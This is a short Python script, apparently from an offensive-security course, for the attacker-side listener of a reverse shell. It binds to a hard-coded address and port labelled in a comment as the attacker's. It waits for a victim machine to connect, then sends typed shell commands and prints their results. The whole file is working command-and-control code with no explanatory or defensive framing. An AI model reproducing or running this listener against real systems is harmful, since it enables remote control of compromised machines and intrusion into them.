#!/usr/bin/env python
import socket, json


class Listener:
    def __init__(self, ip='192.168.217.131', port=4442):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        # attackers ip and port
        listener.bind((ip, port))
        listener.listen(0)
        print("[+] Waiting for incoming connections.....")
        self.connection, address = listener.accept()
        print("[+] Got a connection from " + str(address))

    def reliable_recv(self):
        json_data = self.connection.recv(1024 * 1024)
        return json.loads(json_data.decode())

    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data.encode())

    def execute_remotely(self, command):
        self.reliable_send(command)
        if command[0] == "exit":
            self.connection.close()
            exit()

        return self.reliable_recv()

    def start(self):
        while True:
            try:
                command = input(">> ")
                command = command.split(" ")
                result = self.execute_remotely(command)
                print(result)
            except json.decoder.JSONDecodeError:
                print("[-] Invalid Command")


listener = Listener('192.168.10.8', 4443)
listener.start()
